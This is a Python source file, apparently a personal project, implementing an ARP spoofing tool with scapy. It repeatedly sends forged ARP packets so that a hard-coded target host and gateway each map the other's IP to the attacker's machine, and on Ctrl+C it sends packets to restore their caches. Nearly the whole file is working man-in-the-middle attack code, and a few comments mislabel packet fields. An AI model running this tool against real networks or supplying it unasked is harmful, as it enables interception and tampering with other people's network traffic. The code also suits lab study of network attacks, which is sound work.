from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
import argparse

# AI used for optimalisation and correction of the code + implemented improvements using the ARP-spoofer code of: https://github.com/miraware/arp-spoofer/blob/main/arp-spoofer.py.
class Spoofing:

    def __init__(self):
        self._parser = None
        self._target_ip = None
        self._gateway_ip = None

    def set_args(self):
        self._parser = argparse.ArgumentParser()
        self._parser.add_argument('-t', '--target', dest='_target_ip', help='Target IP Address/Adresses', required=False)
        self._parser.add_argument('-g', '--gateway', dest='_gateway_ip', help='Gateway IP', required=False)  # Set required on True for terminal necessity.
        self._parser.add_argument('-f', '--frequency', dest='frequency', help='Number of seconds to wait before retrying the spoof operation.', required=False)

    def get_args(self):
        # Check for errors i.e. if the user does not specify the target IP Address
        # Quit the program if the argument is missing
        # While quitting also display an error message

        # Initialize.
        parser = self._parser
        target_ip = self._target_ip

        options = parser.parse_args()
        if not options._target_ip:
            # Code to handle if interface is not specified
            parser.print_help()
            # parser.error("[-] Please specify an IP Address or Addresses, use --help for more info.")
        return options

    def set_target_ip(self, target_ip):
        self._target_ip = target_ip

    def set_gateway_ip(self, gateway_ip):
        self._gateway_ip = gateway_ip

    def get_mac(self, ip):
        # Initialize.

        # Configure the destination of the ARP-packet.
        arp_request = ARP(pdst=ip)

        # Configure the broadcast (which devices) to where the request are send to. The broadcast is set to all devices on the local network.
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")

        # Merge the broadcast and ARP information.
        arp_request_broadcast = broadcast / arp_request

        # Perform an ARP ping, getting an answer and an unanswer.
        answered_list, unans = srp(arp_request_broadcast, timeout=3, verbose=False)

        # Return the MAC-adress (hwsrc = hardware source).
        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            print(f"No response for IP: {ip}")
            return None

    def spoof(self):
        """
            Spoof the target IP address pretending to be the spoof IP address
        """
        # Initialize.
        target_ip = self._target_ip
        spoof_ip = self._gateway_ip

        # Get physical adress.
        target_mac = self.get_mac(target_ip)
        #print(target_mac)
        if not target_mac:
            print(f"Could not find MAC address for IP {target_ip}")
            return

        # Setup ARP cache poisoning packet (op = operation {2 = reply}, pdst = protocol destination {target_ip}, hwdst = hardware source, psrc = protocol source {gateway_ip}).
        packet = ARP(op=1, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, count=10, verbose=False)
        #return

    def restore(self):
        """
            Restore the network by reversing the ARP spoofing
        """
        # Initialize.
        target_ip = self._target_ip
        spoof_ip  = self._gateway_ip

        # Get physical adresses.
        target_mac = self.get_mac(target_ip)
        spoof_mac = self.get_mac(spoof_ip)

        # Setup a reverse ARP cache poisoning packet.
        if target_mac and spoof_mac:
            packet = ARP(op=1, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            send(packet, count=5, verbose=False)


def main():
    # Options.
    spoof = Spoofing()
    spoof.set_args()
    spoof.get_args()

    #target_ip = input("VICTIM_IP: ")
    #gateway_ip = input("GATEWAY_IP: ")

    '''
    # Get IP information with parser.
    args = spoof.get_args()
    target_ip = args.target
    gateway_ip = args.gateway
    frequency = args.frequency
    '''

    target_ip = '192.168.100.108'
    gateway_ip = '192.168.100.107'
    frequency = 0.5

    def ip_setup(target_ip, gateway_ip):
        spoof.set_target_ip(target_ip)
        spoof.set_gateway_ip(gateway_ip)

    # Use keyboard interruption to stop the ARP spoofing.
    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop...")
        sent_packets_count = 0
        while True:
            ip_setup(target_ip, gateway_ip)
            spoof.spoof()
            ip_setup(gateway_ip, target_ip)
            spoof.spoof()
            sent_packets_count += 20
            print("\r[*] Packets sent: " + str(sent_packets_count), end="\n")
            if frequency:
                n = int(frequency)
            else:
                n = 2
            time.sleep(n)

    except KeyboardInterrupt:
        print()
        print("Stopping ARP spoofing and restoring network...")
        ip_setup(gateway_ip, target_ip)
        spoof.restore()
        ip_setup(target_ip, gateway_ip)
        spoof.restore()
        print("Network restored.")


if __name__ == "__main__":
    main()
